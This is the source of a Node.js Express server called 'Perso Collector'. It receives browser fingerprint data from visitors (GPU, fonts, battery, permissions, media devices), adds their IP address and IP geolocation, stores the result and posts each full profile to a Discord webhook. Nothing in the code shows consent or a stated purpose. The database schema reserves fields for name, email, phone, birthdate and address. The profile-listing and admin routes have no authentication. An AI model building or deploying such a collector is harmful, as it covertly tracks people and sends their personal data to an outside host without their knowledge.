const express = require('express');
const path = require('path');
const fs = require('fs');
const UAParser = require('ua-parser-js');
const db = require('./db');

const app = express();
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let WEBHOOK = process.env.DISCORD_WEBHOOK || '';
if (!WEBHOOK) {
  try {
    const cfg = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
    WEBHOOK = cfg.discord_webhook || '';
  } catch {}
}
if (!WEBHOOK) console.warn('[warn] DISCORD_WEBHOOK not set — webhook disabled');

const insert = db.prepare(`
INSERT INTO profiles (ip, user_agent, browser, os, device, language, timezone, screen, fingerprint,
  full_name, email, phone, birthdate, address, city, zip, country, geo_lat, geo_lon, geo_city, geo_country, preferences)
VALUES (@ip, @user_agent, @browser, @os, @device, @language, @timezone, @screen, @fingerprint,
  @full_name, @email, @phone, @birthdate, @address, @city, @zip, @country, @geo_lat, @geo_lon, @geo_city, @geo_country, @preferences)
`);

function trunc(s, n = 1024) {
  if (s == null) return '';
  s = String(s);
  return s.length > n ? s.slice(0, n - 1) + '…' : s;
}

async function sendWebhook(record) {
  if (!WEBHOOK) return;

  let prefs = {};
  try { prefs = JSON.parse(record.preferences || '{}'); } catch {}

  // ── compact embed (max ~4000 chars total) ─────────────
  const fields = [
    { name: 'ID', value: String(record.id ?? '—'), inline: true },
    { name: 'IP', value: trunc(record.ip || '—', 60), inline: true },
    { name: 'Browser', value: trunc(record.browser || '—', 80), inline: true },
    { name: 'OS', value: trunc(record.os || '—', 80), inline: true },
    { name: 'Device', value: trunc(record.device || '—', 80), inline: true },
    { name: 'Language', value: trunc(record.language || '—', 40), inline: true },
    { name: 'Timezone', value: trunc(record.timezone || '—', 60), inline: true },
    { name: 'Screen', value: trunc(record.screen || '—', 60), inline: true },
    { name: 'Fingerprint', value: '`' + trunc(record.fingerprint || '—', 80) + '`', inline: false }
  ];

  if (record.geo_lat != null && record.geo_lon != null) {
    fields.push({
      name: 'IP Geolocation',
      value: trunc(`${record.geo_lat}, ${record.geo_lon} — ${record.geo_city || '?'}, ${record.geo_country || '?'}`, 200)
    });
  }

  const signals = [];
  if (prefs.webgl?.unmasked_renderer) signals.push(`GPU: ${prefs.webgl.unmasked_renderer}`);
  if (prefs.hardware_concurrency) signals.push(`Cores: ${prefs.hardware_concurrency}`);
  if (prefs.device_memory_gb) signals.push(`RAM: ${prefs.device_memory_gb}GB`);
  if (prefs.window) signals.push(`Window: ${prefs.window.inner_width}x${prefs.window.inner_height}@${prefs.window.device_pixel_ratio}x`);
  if (prefs.battery) signals.push(`Battery: ${Math.round((prefs.battery.level || 0) * 100)}%${prefs.battery.charging ? ' charging' : ''}`);
  if (prefs.connection) signals.push(`Net: ${prefs.connection.type || '?'} ${prefs.connection.downlink || '?'}Mbps ${prefs.connection.rtt || '?'}ms`);
  if (prefs.media_device_counts) signals.push(`Media: ${prefs.media_device_counts.audio_input}mic/${prefs.media_device_counts.video_input}cam/${prefs.media_device_counts.audio_output}out`);
  if (prefs.fonts?.length) signals.push(`Fonts: ${prefs.fonts.length}`);
  if (prefs.plugins?.length) signals.push(`Plugins: ${prefs.plugins.length}`);
  if (prefs.permissions) {
    const granted = Object.entries(prefs.permissions).filter(([_, v]) => v === 'granted').map(([k]) => k);
    if (granted.length) signals.push(`Granted: ${granted.join(',')}`);
  }
  if (prefs.ua_ch?.platform) signals.push(`CH-Platform: ${prefs.ua_ch.platform}`);

  if (signals.length) {
    fields.push({ name: 'Signals', value: trunc(signals.join(' · '), 900) });
  }

  if (prefs.fonts?.length) {
    fields.push({
      name: 'Fonts',
      value: trunc(prefs.fonts.slice(0, 40).join(', '), 900)
    });
  }

  const embed = {
    title: 'New Profile Collected',
    color: 0x5b8def,
    timestamp: new Date().toISOString(),
    fields: fields.slice(0, 25),
    footer: { text: 'perso-collector · full data attached' }
  };

  // ── full JSON as file attachment ──────────────────────
  const fullJson = JSON.stringify(prefs, null, 2);
  const filename = `profile_${record.id || Date.now()}.json`;

  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    username: 'Perso Collector',
    embeds: [embed]
  }));
  form.append('files[0]', new Blob([fullJson], { type: 'application/json' }), filename);

  try {
    const r = await fetch(WEBHOOK, { method: 'POST', body: form });
    if (!r.ok) {
      const txt = await r.text();
      console.warn('[webhook] HTTP', r.status, txt.slice(0, 300));
    }
  } catch (err) {
    console.warn('[webhook] failed:', err.message);
  }
}

app.post('/api/collect', async (req, res) => {
  try {
    const body = req.body || {};
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const ua = req.headers['user-agent'] || '';
    const parser = new UAParser(ua);
    const u = parser.getResult();

    let geo = {};
    try {
      const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`);
      const j = await r.json();
      if (j.status === 'success') geo = j;
    } catch (_) {}

    const record = {
      ip,
      user_agent: ua,
      browser: `${u.browser.name || ''} ${u.browser.version || ''}`.trim(),
      os: `${u.os.name || ''} ${u.os.version || ''}`.trim(),
      device: `${u.device.vendor || ''} ${u.device.model || ''} ${u.device.type || ''}`.trim(),
      language: body.language || '',
      timezone: body.timezone || '',
      screen: body.screen || '',
      fingerprint: body.fingerprint || '',
      full_name: '',
      email: '',
      phone: '',
      birthdate: '',
      address: '',
      city: geo.city || '',
      zip: geo.zip || '',
      country: geo.country || '',
      geo_lat: geo.lat ?? null,
      geo_lon: geo.lon ?? null,
      geo_city: geo.city || '',
      geo_country: geo.country || '',
      preferences: JSON.stringify({
        ...(body.preferences || {}),
        geo_full: geo
      })
    };

    const info = insert.run(record);
    record.id = info.lastInsertRowid;

    sendWebhook(record);

    res.json({ ok: true, id: record.id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.get('/api/profiles', (req, res) => {
  const rows = db.prepare('SELECT * FROM profiles ORDER BY id DESC').all();
  res.json(rows);
});

app.get('/api/profiles/:id', (req, res) => {
  const row = db.prepare('SELECT * FROM profiles WHERE id = ?').get(req.params.id);
  if (!row) return res.status(404).json({ ok: false });
  res.json(row);
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`http://localhost:${PORT}`));
